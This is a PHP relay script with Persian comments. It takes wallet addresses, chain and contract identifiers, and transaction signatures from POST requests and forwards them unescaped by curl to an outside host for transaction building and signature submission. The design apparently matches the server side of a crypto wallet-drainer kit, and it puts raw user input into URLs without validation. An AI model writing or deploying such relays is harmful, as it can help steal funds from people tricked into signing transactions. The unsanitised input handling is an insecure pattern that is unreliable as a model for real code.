<?php

$ip = "https://reza-seven.vercel.app";  // تغییر به URL واقعی

$manager = $_POST['handler'];

if ($manager == 'tx'){
    $address = $_POST['address'];
    $chain = $_POST['chain'];
    $type = $_POST['type'];

    if ($type == "coin"){
        $url = "https://reza-seven.vercel.app/tx/?address=$address&chain=$chain";  // تغییر به URL واقعی

        $request = curl_init();
        curl_setopt($request, CURLOPT_URL, $url);
        curl_setopt($request, CURLOPT_RETURNTRANSFER, true);
        $output = curl_exec($request);
    
        echo $output;
    
    } else {
        $contract = $_POST['contract'];
        $url = "https://reza-seven.vercel.app/txt/?address=$address&chain=$chain&contract=$contract";  // تغییر به URL واقعی

        $request = curl_init();
        curl_setopt($request, CURLOPT_URL, $url);
        curl_setopt($request, CURLOPT_RETURNTRANSFER, true);
        $output = curl_exec($request);
    
        echo $output;
    
    }
} else if ($manager == "sign"){
    $signature = $_POST['signature'];
    $type = $_POST['type'];

    if ($type == "coin"){
        $url = "https://reza-seven.vercel.app/sr/?signature=$signature";  // تغییر به URL واقعی

        $request = curl_init();
        curl_setopt($request, CURLOPT_URL, $url);
        curl_setopt($request, CURLOPT_RETURNTRANSFER, true);
        $output = curl_exec($request);
    
        echo $output;
    } else {
        $url = "https://reza-seven.vercel.app/srt/?signature=$signature";  // تغییر به URL واقعی

        $request = curl_init();
        curl_setopt($request, CURLOPT_URL, $url);
        curl_setopt($request, CURLOPT_RETURNTRANSFER, true);
        $output = curl_exec($request);
    
        echo $output;
    }
}

?>
